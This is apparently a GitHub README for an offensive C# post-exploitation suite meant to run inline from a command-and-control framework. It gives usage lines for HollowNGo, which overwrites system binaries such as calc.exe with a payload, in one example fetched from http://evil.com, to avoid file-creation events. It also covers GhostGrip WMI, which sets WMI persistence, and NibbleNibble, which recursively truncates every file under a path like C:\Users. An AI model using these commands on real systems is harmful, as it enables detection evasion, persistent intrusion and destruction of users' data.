<div align="center">
	<img src="https://github.com/MrR4tC4k3/SharpC4k3s/blob/90aed9430f5944f569a7e0a0c2caf2a1a47c7b37/examples/SHARPCAKES.png">
</div>
<div align="center">
	Welcome to SharpC4k3s
</div>
<br>

## Tool Suite
- **HollowNGo**
- **GhostGrip WMI**
- **Host2IP**
-  **NibbleNibble**

The SharpC4k3 Suite was designed to be executed inline, however like any C# Program they be used standalone also. All Tools leverage .Net v2 to ensure compatibility with target hosts.

## HollowNGO
HollowNGo aims to avoid FileCreation Events by utilising and hijacking files that already exist on disk. This is achieved by reading your payload as a compressed byte array and converting it to base64 which is then stored in a memorysteam. HollowNGo then sets the target file stream length to 0, and using the orignal encoding operation in reverse, writes to the target file. There are a few options when running the tool as shown below. Note that creating the encoded binary data locally (-encode) it is expected to run on your dev box not the target.

#### Create compressed encoded binary data
**Usage:** HollowNGo.exe -encode <source.exe> -output <output.txt>
- **Example:** HollowNGo.exe C:\Users\User\Documents\MyEvil.Exe -output EvilB64.txt

#### Via data output from -encode option
**Usage:** HollowNGo.exe -source <base64_content> -target <target.exe>
- **Example:** dotnet inline-execute HollowNGo.exe -sourcelocal <EvilB64.Code> -target C:\Windows\System32\calc.exe

#### Via remote hosted file
**Usage:** UsageHollowNGo.exe -sourceremote <SourceURI> -target <target.exe>
- **Example:** dotnet inline-execute HollowNGo.exe -sourceremote http://evil.com/payload.exe -target C:\Windows\System32\calc.exe
<div align="center">
	<img src="https://github.com/MrR4tC4k3/SharpC4k3s/blob/c674b6dd870ddc8f4c7601b8d9e18f0feec36381/examples/HollowNGo.png">
</div>
<div align="center">
	HollowNGo Havoc example
</div>
<br>

## GhostGrip WMI
GhostGrip WMI aims to simplify the process of setting WMI persistence on your target with easy to use flag options. Ghost Grip WMI creates a WMIEventSubscription based on your prefered event for persistence as well as its execution method. Use HollowNGo prior to set up your executable to avoid FileCreation Events.

**Usage:** GhostGrip_WMI.exe -location <path_to_executable> -type <time/logon/eventcode> -execution <executiontype> -randomizename <true/false>
- **Example:** dotnet inline-exeucte GhostGrip_WMI.exe -location C:\Windows\System32\calc.exe -type eventcode -eventcode 4726 -execution direct -randomizename true
- **Example:** dotnet inline-exeucte GhostGrip_WMI.exe -location C:\Windows\System32\calc.exe -type logon -execution invoke-wmimethod -randomizename false
<div align="center">
	<img src="https://github.com/MrR4tC4k3/SharpC4k3s/blob/77242f2d974647427e6df74a15df5de9512e4070/examples/GhostGrip_WMI.png">
</div>
<div align="center">
	GhostGrip WMI Havoc example
</div>
<br>

## NibbleNibble
A somewhat pointless tool, NibbleNibble simply recursively sets target files stream length to 0 from a given directory path.

**Usage:** NibbleNibble.exe -path <TargetStartPath>
- **Example:** dotnet inline-execute NibbleNibble.exe -path C:\Users

### **Disclaimer:** These tools are not to be used for any unauthorized activity :)
